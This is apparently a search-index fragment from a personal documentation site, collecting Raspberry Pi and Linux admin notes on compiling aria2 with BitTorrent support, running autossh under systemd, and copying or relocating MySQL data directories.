autoconf automake libcppunit-dev autopoint openssl libtool sphinx-common sphinxsearch libgcrypt11-dev libxml2-dev pkg-config --enable-bittorrent --enable-metalink \u6dfb\u52a0BT\u548c\u78c1\u529b\u94fe\u7684\u652f\u6301 ubuntu 10.04.4 512M\u5185\u5b58 AMD LX800\u4f4e\u529f\u8017\u4e3b\u673a \u4e3b\u9891500MHz\u4e0a\u9762\u7684\u7f16\u8bd1\u7ed3\u679c configure: summary of build options: version: 0.1.1 shared 0:0:0 Host type: i586-pc-linux-gnu Install prefix: /usr/local C compiler: gcc CFlags: -g -O2 Library types: Shared=yes, Static=yes CUnit: no Build: i586-pc-linux-gnu Host: i586-pc-linux-gnu Target: i586-pc-linux-gnu Install prefix: /usr/local CC: gcc CXX: g++ CPP: gcc -E CXXFLAGS: -g -O2 CFLAGS: -g -O2 CPPFLAGS: -I$(top_builddir)/deps/wslay/lib/includes -I$(top_srcdir)/deps/wslay/lib/includes -I/usr/include/libxml2 LDFLAGS: -all-static -static-libgcc -static-libstdc++ LIBS: -lrt -lgcrypt -lxml2 -lz -lpthread -ldl -lrt DEFS: -DHAVE_CONFIG_H LibUV: no SQLite3: no SSL Support: AppleTLS: GnuTLS: no OpenSSL: no CA Bundle: LibXML2: yes LibExpat: LibCares: no Zlib: yes Epoll: yes Bittorrent: yes Metalink: yes XML-RPC: yes Message Digest: yes WebSocket: yes Libaria2: no bash_completion dir: ${datarootdir}/doc/${PACKAGE_TARNAME}/bash_completion Static build: yes \u6811\u8393\u6d3e2 Arm 4\u6838 1G\u5185\u5b58 \u4e3b\u9891 900MHz Ubuntu mate 15.04 vivid configure: summary of build options: version: 0.1.1 shared 0:0:0 Host type: armv7l-unknown-linux-gnueabihf Install prefix: /usr/local C compiler: gcc CFlags: -g -O2 Library types: Shared=yes, Static=yes CUnit: no Build: armv7l-unknown-linux-gnueabihf Host: armv7l-unknown-linux-gnueabihf Target: armv7l-unknown-linux-gnueabihf Install prefix: /usr/local CC: gcc CXX: g++ CPP: gcc -E CXXFLAGS: -g -O2 CFLAGS: -g -O2 CPPFLAGS: -I$(top_builddir)/deps/wslay/lib/includes -I$(top_srcdir)/deps/wslay/lib/includes -I/usr/include/libxml2 LDFLAGS: LIBS: -lgcrypt -lxml2 DEFS: -DHAVE_CONFIG_H LibUV: no SQLite3: no SSL Support: AppleTLS: GnuTLS: no OpenSSL: no CA Bundle: LibXML2: yes LibExpat: LibCares: no Zlib: no Epoll: yes Bittorrent: yes Metalink: yes XML-RPC: yes Message Digest: yes WebSocket: yes Libaria2: no bash_completion dir: ${datarootdir}/doc/${PACKAGE_TARNAME}/bash_completion Static build: \u540c\u65f6\u653e\u4e0a\u6811\u8393\u6d3e2 Ubuntu mate 15.04 vivid \u7684\u8f6f\u4ef6\u6e90 deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-updates main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-security main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-backports main restricted universe multiverse \u8fd9\u4e2a\u6bd4\u81ea\u5e26\u7684\u8f6f\u4ef6\u6e90\u5feb\u5f88\u591a 400k \u548c 50k \u4e0b\u8f7d\u901f\u5ea6\u7684\u5dee\u8ddd Bittorrent: yes Metalink: yes Static build: yes \u9ed8\u8ba4\u8fd9\u4e9b\u90fd\u662fno\uff0c\u4e5f\u5c31\u662f\u4e0d\u652f\u6301\u7684\u610f\u601d coufigure\u4e4b\u540e\u5c31\u662fmake\u548c\u5b89\u88c5\u4e86\uff0c\u5efa\u8bae\u5148\u5378\u4e86\u81ea\u5e26\u7684 sudo apt-get remove aria2 \u7136\u540e\u5728\u4f7f\u7528\u81ea\u5df1\u7684\u7f16\u8bd1\u7248\u672c sudo make sudo make install \u975e\u5e38\u65e0\u8bed\u7684\u662f\u672c\u6765\u5c313M\u591a\u7684\u6e90\u7801\u7f16\u8bd1\u4e86\u4ee5\u540e\u8981\u51e0\u767eM \u6811\u8393\u6d3e2 \u8fd8\u597d 4\u6838\u7f16\u8bd1\u901f\u5ea6\u4f9d\u65e7\u8fd8\u662f\u5f88\u6162\uff0c\u6ca1\u611f\u89c9\u80fd\u6bd4\u4f4e\u4e3b\u9891\u7684X86cpu\u5feb \u9644\u5e26 aria2 \u914d\u7f6e\u6587\u4ef6 enable-rpc=true rpc-allow-origin-all=true rpc-listen-all=true rpc-listen-port=6800 #event-poll=select disable-ipv6=true max-concurrent-downloads=2 continue=true max-connection-per-server=5 min-split-size=10M split=5 max-overall-download-limit=0 max-download-limit=0 max-overall-upload-limit=15k max-upload-limit=15k #lowest-speed-limit=0 #referer=* input-file=/etc/aria2/session.txt save-session=/etc/aria2/session.txt save-session-interval=30 dir=/nas/aria2 disk-cache=16M enable-mmap=true file-allocation=none force-save=true follow-torrent=true bt-hash-check-seed=true bt-seed-unverified=true bt-save-metadata=true #bt-request-peer-speed-limit=2M bt-save-metadata=true #seed-time=10 seed-ratio=0.1 log=/etc/aria2/aria2.log log-level=error max-download-result=50 \u542f\u52a8\u811a\u672c\u4fdd\u5b58\u5728 /etc/init.d/aria2 #!/bin/sh ### BEGIN INIT INFO # Provides: aria2 # Required-Start: # Required-Stop: # Default-Start: # Default-Stop: # Short-Description: aria2 ### END INIT INFO case $1 in start) touch /etc/aria2/session.txt /usr/bin/aria2c --conf-path=/etc/aria2/aria2.conf -D ;; stop) killall aria2c ;; *) echo \"Usage: /etc/init.d/aria2 {start|stop}\" exit 1 ;; esac exit 0 \u589e\u52a0\u542f\u52a8\u9879 \u5f15\u7528sudo update-rc.d aria2 defaults \u8fd9\u5c31\u662f\u4e3a\u561b\u7f16\u8bd1\u7684\u4e4b\u540e\u7684aria2\u6ca1\u6709BT\u4e0b\u8f7d\u529f\u80fd\u7684\u539f\u56e0\uff0c\u8c8c\u4f3c\u8fd9\u73a9\u610f\u4e0d\u52a0\u53c2\u6570\u4e0d\u7f16\u8bd1\u6210\u53ef\u7528 \u539f\u6587\u94fe\u63a5\uff1a https://www.iteye.com/blog/happysoul-2218060","title":"Aria2 \u7f16\u8bd1 \u6dfb\u52a0\u652f\u6301BT\u4e0b\u8f7d\u7684\u529f\u80fd\uff08X86\u548carmhf\u7684\u6811\u8393\u6d3e2\uff09"},{"location":"RPI/Autossh%20and%20Systemd%20Service/","text":"Autossh and Systemd Service Several months ago, I wrote a post to describe how to setup an autossh daemon with upstart . Since Ubuntu 15.04 has switched to systemd , I would like to do the same with systemd . I will give a brief introduction to systemd in this post. Systemd Unit File Systemd services are configured by unit files . By convention, these files use .service as their file name extension. On Ubuntu, there are two directories for unit files : /lib/systemd -- This is the directory for unit files provided by the installed packages. /etc/systemd -- This is the directory for the administrators to create, override, modify or mask the unit files in /lib/systemd . Although the autossh package does not come with any unit file, we can create one in /lib/systemd : $ sudo vim /lib/systemd/system/autossh.service Here's the content of the unit file: [Unit] Description=autossh Wants=network-online.target After=network-online.target [Service] Type=simple User=autossh EnvironmentFile=/etc/default/autossh ExecStart= ExecStart=/usr/bin/autossh $SSH_OPTIONS Restart=always RestartSec=60 [Install] WantedBy=multi-user.target Some explanations to the options: Description= contains some words that can describe the service. This will show up in the logs. Wants= specifies the dependencies of the services. If this service is activated, systemd will also activate the listed services. In our case, we would like to make sure that the network interface is ready, thus we specified network-online.target [1] . * After= specifies the order to launch the service. With the After option, systemd will only launch the service after the activation of listed services. Notice that this option is orthogonal to Wants (or Requires .) If After is not specified, systemd may launch the dependencies simultaneously. * Type= specifies the type of the service. There are several options: simple, fork, oneshot, and etc. + A **simple** service will contain one long running process. The process will not stop unless we kill the service. + A **fork** service means that the `ExecStart` command will fork a subprocess and return immediately. In the other words, the command will manage the process by themselves. + An **oneshot** service will launch a new process whenever an event triggers this service. User= specifies the user as whom the service process is run. By default, the process is run as root . EnvironmentFile= specifies the path to an environment file, which contains the environment variables for the service process. ExecStart= specifies the command to launch the service. We have to specify the full path to the executable to be executed. Notice that there are two ExecStart in our unit file. They are not typos. In order to allow this unit file to be included by another unit file, we have to clear ExecStart before specifying a new command. * WantedBy= specifies the init stage to launch the service (if the service is enabled.) Now, we can create a soft link in /etc/systemd/system : $ sudo ln -s /lib/systemd/system/autossh.service \\ /etc/systemd/system/autossh.service Environment File Did you notice that there is a variable $SSH_OPTIONS in the ExecStart option above? It will be substituted by the environment variable from the file specified by EnvironmentFile . Environment files are the files which contain the configurations which should be passed to the service. Let's create an environment file: $ sudo vim /etc/default/autossh The environment file resembles to a Bash script. Here's the example for our autossh service: AUTOSSH_POLL=60 AUTOSSH_FIRST_POLL=30 AUTOSSH_GATETIME=0 AUTOSSH_PORT=22000 SSH_OPTIONS=\"-N -R 2222:localhost:22 example.com -i /home/autossh/.ssh/id_rsa\" We can find more options by reading autossh man pages. Start the Service Before we can start our service, we have to ask systemd to reload all unit files: $ sudo systemctl daemon-reload Now, we can start autossh service with: $ sudo systemctl start autossh And then, we can check the status with: $ sudo systemctl status autossh With this command, you should be able to see the following output (if the unit file is correct): * autossh.service - autossh Loaded: loaded (/lib/systemd/system/autossh.service; enabled; vendor preset: enabled) Active: active (running) since Sun 2015-11-15 22:51:25 CST; 1min 1s ago Main PID: 14382 (autossh) CGroup: /system.slice/autossh.service |-14382 /usr/lib/autossh/autossh -N -R 8022:localhost:22 .... `-14385 /usr/bin/ssh -L ... If there are some problems, check /var/log/syslog for more details. BTW, to stop the service, we can use the following command: $ sudo systemctl stop autossh Launch Service at Boot Time OK. If everything goes well, then we may ask systemd to launch our service during the boot time. To do so, we have to enable the service with: $ sudo systemctl enable autossh Conclusion In this post, I have covered some basic concept of systemd unit files and basic commands to control systemd : Reload unit files with sudo systemctl daemon-reload Start/stop service with: sudo systemctl [start/stop] [name] Check service status with: sudo systemctl status [name] Register/unregister the service for the boot time with: sudo systemctl [enable/disable] [name] Hope you enjoy this article. Reference Wikipedia: systemd Arch Linux wiki: systemd Ubuntu wiki: systemd for upstart users RedHat RHEL7: System Administrator's Guide: Chapter 8 Systemd Manuals : systemd.unit and systemd.service . Running Services After the Network is up | [1] | It is non-trivial to write an unit file for the service that requires network connections, read Running Services After the Network is up for more details. | \u539f\u6587\u94fe\u63a5\uff1a http://logan.tw/posts/2015/11/15/autossh-and-systemd-service/","title":"Autossh and Systemd Service"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#autossh-and-systemd-service","text":"Several months ago, I wrote a post to describe how to setup an autossh daemon with upstart . Since Ubuntu 15.04 has switched to systemd , I would like to do the same with systemd . I will give a brief introduction to systemd in this post.","title":"Autossh and Systemd Service"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#systemd-unit-file","text":"Systemd services are configured by unit files . By convention, these files use .service as their file name extension. On Ubuntu, there are two directories for unit files : /lib/systemd -- This is the directory for unit files provided by the installed packages. /etc/systemd -- This is the directory for the administrators to create, override, modify or mask the unit files in /lib/systemd . Although the autossh package does not come with any unit file, we can create one in /lib/systemd : $ sudo vim /lib/systemd/system/autossh.service Here's the content of the unit file: [Unit] Description=autossh Wants=network-online.target After=network-online.target [Service] Type=simple User=autossh EnvironmentFile=/etc/default/autossh ExecStart= ExecStart=/usr/bin/autossh $SSH_OPTIONS Restart=always RestartSec=60 [Install] WantedBy=multi-user.target Some explanations to the options: Description= contains some words that can describe the service. This will show up in the logs. Wants= specifies the dependencies of the services. If this service is activated, systemd will also activate the listed services. In our case, we would like to make sure that the network interface is ready, thus we specified network-online.target [1] . * After= specifies the order to launch the service. With the After option, systemd will only launch the service after the activation of listed services. Notice that this option is orthogonal to Wants (or Requires .) If After is not specified, systemd may launch the dependencies simultaneously. * Type= specifies the type of the service. There are several options: simple, fork, oneshot, and etc. + A **simple** service will contain one long running process. The process will not stop unless we kill the service. + A **fork** service means that the `ExecStart` command will fork a subprocess and return immediately. In the other words, the command will manage the process by themselves. + An **oneshot** service will launch a new process whenever an event triggers this service. User= specifies the user as whom the service process is run. By default, the process is run as root . EnvironmentFile= specifies the path to an environment file, which contains the environment variables for the service process. ExecStart= specifies the command to launch the service. We have to specify the full path to the executable to be executed. Notice that there are two ExecStart in our unit file. They are not typos. In order to allow this unit file to be included by another unit file, we have to clear ExecStart before specifying a new command. * WantedBy= specifies the init stage to launch the service (if the service is enabled.) Now, we can create a soft link in /etc/systemd/system : $ sudo ln -s /lib/systemd/system/autossh.service \\ /etc/systemd/system/autossh.service","title":"Systemd Unit File"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#environment-file","text":"Did you notice that there is a variable $SSH_OPTIONS in the ExecStart option above? It will be substituted by the environment variable from the file specified by EnvironmentFile . Environment files are the files which contain the configurations which should be passed to the service. Let's create an environment file: $ sudo vim /etc/default/autossh The environment file resembles to a Bash script. Here's the example for our autossh service: AUTOSSH_POLL=60 AUTOSSH_FIRST_POLL=30 AUTOSSH_GATETIME=0 AUTOSSH_PORT=22000 SSH_OPTIONS=\"-N -R 2222:localhost:22 example.com -i /home/autossh/.ssh/id_rsa\" We can find more options by reading autossh man pages.","title":"Environment File"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#start-the-service","text":"Before we can start our service, we have to ask systemd to reload all unit files: $ sudo systemctl daemon-reload Now, we can start autossh service with: $ sudo systemctl start autossh And then, we can check the status with: $ sudo systemctl status autossh With this command, you should be able to see the following output (if the unit file is correct): * autossh.service - autossh Loaded: loaded (/lib/systemd/system/autossh.service; enabled; vendor preset: enabled) Active: active (running) since Sun 2015-11-15 22:51:25 CST; 1min 1s ago Main PID: 14382 (autossh) CGroup: /system.slice/autossh.service |-14382 /usr/lib/autossh/autossh -N -R 8022:localhost:22 .... `-14385 /usr/bin/ssh -L ... If there are some problems, check /var/log/syslog for more details. BTW, to stop the service, we can use the following command: $ sudo systemctl stop autossh","title":"Start the Service"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#launch-service-at-boot-time","text":"OK. If everything goes well, then we may ask systemd to launch our service during the boot time. To do so, we have to enable the service with: $ sudo systemctl enable autossh","title":"Launch Service at Boot Time"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#conclusion","text":"In this post, I have covered some basic concept of systemd unit files and basic commands to control systemd : Reload unit files with sudo systemctl daemon-reload Start/stop service with: sudo systemctl [start/stop] [name] Check service status with: sudo systemctl status [name] Register/unregister the service for the boot time with: sudo systemctl [enable/disable] [name] Hope you enjoy this article.","title":"Conclusion"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#reference","text":"Wikipedia: systemd Arch Linux wiki: systemd Ubuntu wiki: systemd for upstart users RedHat RHEL7: System Administrator's Guide: Chapter 8 Systemd Manuals : systemd.unit and systemd.service . Running Services After the Network is up | [1] | It is non-trivial to write an unit file for the service that requires network connections, read Running Services After the Network is up for more details. | \u539f\u6587\u94fe\u63a5\uff1a http://logan.tw/posts/2015/11/15/autossh-and-systemd-service/","title":"Reference"},{"location":"RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/","text":"Copying MySQL Databases to Another Machine 2.11.13 Copying MySQL Databases to Another Machine In cases where you need to transfer databases between different architectures, you can use mysqldump to create a file containing SQL statements. You can then transfer the file to the other machine and feed it as input to the mysql client. Use mysqldump --help to see what options are available. The easiest (although not the fastest) way to move a database between two machines is to run the following commands on the machine on which the database is located: mysqladmin -h '*other_hostname*' create *db_name* mysqldump *db_name* | mysql -h '*other_hostname*' *db_name* If you want to copy a database from a remote machine over a slow network, you can use these commands: mysqladmin create *db_name* mysqldump -h '*other_hostname*' --compress *db_name* | mysql *db_name* You can also store the dump in a file, transfer the file to the target machine, and then load the file into the database there. For example, you can dump a database to a compressed file on the source machine like this: mysqldump --quick *db_name* | gzip > *db_name*.gz Transfer the file containing the database contents to the target machine and run these commands there: mysqladmin create *db_name* gunzip < *db_name*.gz | mysql *db_name* You can also use mysqldump and mysqlimport to transfer the database. For large tables, this is much faster than simply using mysqldump . In the following commands, DUMPDIR represents the full path name of the directory you use to store the output from mysqldump . First, create the directory for the output files and dump the database: mkdir *DUMPDIR* mysqldump --tab=*DUMPDIR* *db_name* Then transfer the files in the DUMPDIR directory to some corresponding directory on the target machine and load the files into MySQL there: mysqladmin create *db_name* # create database cat *DUMPDIR*/*.sql | mysql *db_name* # create tables in database mysqlimport *db_name* *DUMPDIR*/*.txt # load data into tables Do not forget to copy the mysql database because that is where the grant tables are stored. You might have to run commands as the MySQL root user on the new machine until you have the mysql database in place. After you import the mysql database on the new machine, execute mysqladmin flush-privileges so that the server reloads the grant table information. Note You can copy the .frm , .MYI , and .MYD files for MyISAM tables between different architectures that support the same floating-point format. (MySQL takes care of any byte-swapping issues.) See Section 15.2, \u201cThe MyISAM Storage Engine\u201d . \u539f\u6587\u94fe\u63a5\uff1a https://dev.mysql.com/doc/refman/5.7/en/copying-databases.html","title":"Copying MySQL Databases to Another Machine"},{"location":"RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/#copying-mysql-databases-to-another-machine","text":"","title":"Copying MySQL Databases to Another Machine"},{"location":"RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/#21113-copying-mysql-databases-to-another-machine","text":"In cases where you need to transfer databases between different architectures, you can use mysqldump to create a file containing SQL statements. You can then transfer the file to the other machine and feed it as input to the mysql client. Use mysqldump --help to see what options are available. The easiest (although not the fastest) way to move a database between two machines is to run the following commands on the machine on which the database is located: mysqladmin -h '*other_hostname*' create *db_name* mysqldump *db_name* | mysql -h '*other_hostname*' *db_name* If you want to copy a database from a remote machine over a slow network, you can use these commands: mysqladmin create *db_name* mysqldump -h '*other_hostname*' --compress *db_name* | mysql *db_name* You can also store the dump in a file, transfer the file to the target machine, and then load the file into the database there. For example, you can dump a database to a compressed file on the source machine like this: mysqldump --quick *db_name* | gzip > *db_name*.gz Transfer the file containing the database contents to the target machine and run these commands there: mysqladmin create *db_name* gunzip < *db_name*.gz | mysql *db_name* You can also use mysqldump and mysqlimport to transfer the database. For large tables, this is much faster than simply using mysqldump . In the following commands, DUMPDIR represents the full path name of the directory you use to store the output from mysqldump . First, create the directory for the output files and dump the database: mkdir *DUMPDIR* mysqldump --tab=*DUMPDIR* *db_name* Then transfer the files in the DUMPDIR directory to some corresponding directory on the target machine and load the files into MySQL there: mysqladmin create *db_name* # create database cat *DUMPDIR*/*.sql | mysql *db_name* # create tables in database mysqlimport *db_name* *DUMPDIR*/*.txt # load data into tables Do not forget to copy the mysql database because that is where the grant tables are stored. You might have to run commands as the MySQL root user on the new machine until you have the mysql database in place. After you import the mysql database on the new machine, execute mysqladmin flush-privileges so that the server reloads the grant table information. Note You can copy the .frm , .MYI , and .MYD files for MyISAM tables between different architectures that support the same floating-point format. (MySQL takes care of any byte-swapping issues.) See Section 15.2, \u201cThe MyISAM Storage Engine\u201d . \u539f\u6587\u94fe\u63a5\uff1a https://dev.mysql.com/doc/refman/5.7/en/copying-databases.html","title":"2.11.13\u00a0Copying MySQL Databases to Another Machine"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/","text":"How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04 | DigitalOcean DigitalOcean Homepage ### Introduction Databases grow over time, sometimes outgrowing the space on the file system. You can also run into I/O contention when they\u2019re located on the same partition as the rest of the operating system. RAID, network block storage, and other devices can offer redundancy and other desirable features. Whether you\u2019re adding more space, evaluating ways to optimize performance, or looking to take advantage of other storage features, this tutorial will guide you through relocating MySQL\u2019s data directory. Prerequisites To complete this guide, you will need: An Ubuntu 16.04 server with a non-root user with sudo privileges . You can learn more about how to set up a user with these privileges in our Initial Server Setup with Ubuntu 16.04 guide. A MySQL server . If you haven\u2019t already installed MySQL, the How To Install MySQL on Ubuntu 16.04 guide can help you. In this example, we\u2019re moving the data to a block storage device mounted at /mnt/volume-nyc1-01 . You can learn how to set one up in the How To Use Block Storage on DigitalOcean guide. No matter what underlying storage you use, this guide can help you move the data directory to a new location. Step 1 \u2014 Moving the MySQL Data Directory To prepare for moving MySQL\u2019s data directory, let\u2019s verify the current location by starting an interactive MySQL session using the administrative credentials. 1. mysql -u root -p When prompted, supply the MySQL root password. Then from the MySQL prompt, select the data directory: 1. select @@datadir; Output+-----------------+ | @@datadir | +-----------------+ | /var/lib/mysql/ | +-----------------+ 1 row in set (0.00 sec) This output confirms that MySQL is configured to use the default data directory, /var/lib/mysql/, so that\u2019s the directory we need to move. Once you\u2019ve confirmed this, type exit to leave the monitor. To ensure the integrity of the data, we\u2019ll shut down MySQL before we actually make changes to the data directory: 1. sudo systemctl stop mysql systemctl doesn\u2019t display the outcome of all service management commands, so if you want to be sure you\u2019ve succeeded, use the following command: 1. sudo systemctl status mysql You can be sure it\u2019s shut down if the final line of the output tells you the server is stopped: Output. . . Jul 18 11:24:20 ubuntu-512mb-nyc1-01 systemd[1]: Stopped MySQL Community Server. Now that the server is shut down, we\u2019ll copy the existing database directory to the new location with rsync . Using the -a flag preserves the permissions and other directory properties, while -v provides verbose output so you can follow the progress. Note: Be sure there is no trailing slash on the directory, which may be added if you use tab completion. When there\u2019s a trailing slash, rsync will dump the contents of the directory into the mount point instead of transferring it into a containing mysql directory: 1. sudo rsync -av /var/lib/mysql /mnt/volume-nyc1-01 Once the rsync is complete, rename the current folder with a .bak extension and keep it until we\u2019ve confirmed the move was successful. By re-naming it, we\u2019ll avoid confusion that could arise from files in both the new and the old location: 1. sudo mv /var/lib/mysql /var/lib/mysql.bak Now we\u2019re ready to turn our attention to configuration. Step 2 \u2014 Pointing to the New Data Location MySQL has several ways to override configuration values. By default, the datadir is set to /var/lib/mysql in the /etc/mysql/mysql.conf.d/mysqld.cnf file. Edit this file to reflect the new data directory: 1. sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf Find the line that begins with datadir= and change the path which follows to reflect the new location. In our case, the updated file looks like the output below: /etc/mysql/mysql.conf.d/mysqld.cnf . . . datadir=/mnt/volume-nyc1-01/mysql . . . This seems like the right time to bring up MySQL again, but there\u2019s one more thing to configure before we can do that successfully. Step 3 \u2014 Configuring AppArmor Access Control Rules We\u2019ll need to tell AppArmor to let MySQL write to the new directory by creating an alias between the default directory and the new location. To do this, edit the AppArmor alias file: 1. sudo nano /etc/apparmor.d/tunables/alias At the bottom of the file, add the following alias rule: . . . [label /etc/apparmor.d/tunables/alias] alias /var/lib/mysql/ -> /mnt/volume-nyc1-01/mysql/, . . . For the changes to take effect, restart AppArmor: 1. sudo systemctl restart apparmor Note: If you skipped the AppArmor configuration step, you would run into the following error message: OutputJob for mysql.service failed because the control process exited with error code. See \"systemctl status mysql.service\" and \"journalctl -xe\" for details. The output from both systemctl and journalctl concludes with: OutputJul 18 11:03:24 ubuntu-512mb-nyc1-01 systemd[1]: mysql.service: Main process exited, code=exited, status=1/FAILURE Since the messages don\u2019t make an explicit connection between AppArmor and the data directory, this error can take some time to figure out. Step 4 \u2014 Restarting MySQL The next step is to start MySQL, but if you do, you\u2019ll run into another error. This time, instead of an AppArmor issue, the error happens because the script mysql-systemd-start checks for the existence of either a directory, -d , or a symbolic link, -L , that matches two default paths. It fails if they\u2019re not found: /usr/share/mysql/mysql-systemd-start . . . if [ ! -d /var/lib/mysql ] && [ ! -L /var/lib/mysql ]; then echo \"MySQL data dir not found at /var/lib/mysql. Please create one.\" exit 1 fi if [ ! -d /var/lib/mysql/mysql ] && [ ! -L /var/lib/mysql/mysql ]; then echo \"MySQL system database not found. Please run mysql_install_db tool.\" exit 1 fi . . . Since we need these to start the server, we will create the minimal directory structure to pass the script\u2019s environment check. 1. sudo mkdir /var/lib/mysql/mysql -p Now we\u2019re ready to start MySQL. 1. sudo systemctl start mysql 2. sudo systemctl status mysql To make sure that the new data directory is indeed in use, start the MySQL monitor. 1. mysql -u root -p Look at the value for the data directory again: Output+----------------------------+ | @@datadir | +----------------------------+ | /mnt/volume-nyc1-01/mysql/ | +----------------------------+ 1 row in set (0.01 sec) Now that you\u2019ve restarted MySQL and confirmed that it\u2019s using the new location, take the opportunity to ensure that your database is fully functional. Once you\u2019ve verified the integrity of any existing data, you can remove the backup data directory: 1. sudo rm -Rf /var/lib/mysql.bak Restart MySQL one final time to be sure that it works as expected: 1. sudo systemctl restart mysql 2. sudo systemctl status mysql Conclusion In this tutorial, we\u2019ve moved MySQL\u2019s data directory to a new location and updated Ubuntu\u2019s AppArmor ACLs to accommodate the adjustment. Although we were using a Block Storage device, the instructions here should be suitable for redefining the location of the data directory regardless of the underlying technology. For more on managing MySQL\u2019s data directories, see these sections in the official MySQL documentation: The Mysql Data Directory Setting Up Multiple Data Directories \u539f\u6587\u94fe\u63a5\uff1a https://www.digitalocean.com/community/tutorials/how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-16-04","title":"How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-1604-digitalocean-digitalocean-homepage","text":"### Introduction Databases grow over time, sometimes outgrowing the space on the file system. You can also run into I/O contention when they\u2019re located on the same partition as the rest of the operating system. RAID, network block storage, and other devices can offer redundancy and other desirable features. Whether you\u2019re adding more space, evaluating ways to optimize performance, or looking to take advantage of other storage features, this tutorial will guide you through relocating MySQL\u2019s data directory.","title":"How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04 | DigitalOcean DigitalOcean Homepage"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#prerequisites","text":"To complete this guide, you will need: An Ubuntu 16.04 server with a non-root user with sudo privileges . You can learn more about how to set up a user with these privileges in our Initial Server Setup with Ubuntu 16.04 guide. A MySQL server . If you haven\u2019t already installed MySQL, the How To Install MySQL on Ubuntu 16.04 guide can help you. In this example, we\u2019re moving the data to a block storage device mounted at /mnt/volume-nyc1-01 . You can learn how to set one up in the How To Use Block Storage on DigitalOcean guide. No matter what underlying storage you use, this guide can help you move the data directory to a new location.","title":"Prerequisites"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-1-moving-the-mysql-data-directory","text":"To prepare for moving MySQL\u2019s data directory, let\u2019s verify the current location by starting an interactive MySQL session using the administrative credentials. 1. mysql -u root -p When prompted, supply the MySQL root password. Then from the MySQL prompt, select the data directory: 1. select @@datadir; Output+-----------------+ | @@datadir | +-----------------+ | /var/lib/mysql/ | +-----------------+ 1 row in set (0.00 sec) This output confirms that MySQL is configured to use the default data directory, /var/lib/mysql/, so that\u2019s the directory we need to move. Once you\u2019ve confirmed this, type exit to leave the monitor. To ensure the integrity of the data, we\u2019ll shut down MySQL before we actually make changes to the data directory: 1. sudo systemctl stop mysql systemctl doesn\u2019t display the outcome of all service management commands, so if you want to be sure you\u2019ve succeeded, use the following command: 1. sudo systemctl status mysql You can be sure it\u2019s shut down if the final line of the output tells you the server is stopped: Output. . . Jul 18 11:24:20 ubuntu-512mb-nyc1-01 systemd[1]: Stopped MySQL Community Server. Now that the server is shut down, we\u2019ll copy the existing database directory to the new location with rsync . Using the -a flag preserves the permissions and other directory properties, while -v provides verbose output so you can follow the progress. Note: Be sure there is no trailing slash on the directory, which may be added if you use tab completion. When there\u2019s a trailing slash, rsync will dump the contents of the directory into the mount point instead of transferring it into a containing mysql directory: 1. sudo rsync -av /var/lib/mysql /mnt/volume-nyc1-01 Once the rsync is complete, rename the current folder with a .bak extension and keep it until we\u2019ve confirmed the move was successful. By re-naming it, we\u2019ll avoid confusion that could arise from files in both the new and the old location: 1. sudo mv /var/lib/mysql /var/lib/mysql.bak Now we\u2019re ready to turn our attention to configuration.","title":"Step 1 \u2014 Moving the MySQL Data Directory"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-2-pointing-to-the-new-data-location","text":"MySQL has several ways to override configuration values. By default, the datadir is set to /var/lib/mysql in the /etc/mysql/mysql.conf.d/mysqld.cnf file. Edit this file to reflect the new data directory: 1. sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf Find the line that begins with datadir= and change the path which follows to reflect the new location. In our case, the updated file looks like the output below: /etc/mysql/mysql.conf.d/mysqld.cnf . . . datadir=/mnt/volume-nyc1-01/mysql . . . This seems like the right time to bring up MySQL again, but there\u2019s one more thing to configure before we can do that successfully.","title":"Step 2 \u2014 Pointing to the New Data Location"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-3-configuring-apparmor-access-control-rules","text":"We\u2019ll need to tell AppArmor to let MySQL write to the new directory by creating an alias between the default directory and the new location. To do this, edit the AppArmor alias file: 1. sudo nano /etc/apparmor.d/tunables/alias At the bottom of the file, add the following alias rule: . . . [label /etc/apparmor.d/tunables/alias] alias /var/lib/mysql/ -> /mnt/volume-nyc1-01/mysql/, . . . For the changes to take effect, restart AppArmor: 1. sudo systemctl restart apparmor Note: If you skipped the AppArmor configuration step, you would run into the following error message: OutputJob for mysql.service failed because the control process exited with error code. See \"systemctl status mysql.service\" and \"journalctl -xe\" for details. The output from both systemctl and journalctl concludes with: OutputJul 18 11:03:24 ubuntu-512mb-nyc1-01 systemd[1]: mysql.service: Main process exited, code=exited, status=1/FAILURE Since the messages don\u2019t make an explicit connection between AppArmor and the data directory, this error can take some time to figure out.","title":"Step 3 \u2014 Configuring AppArmor Access Control 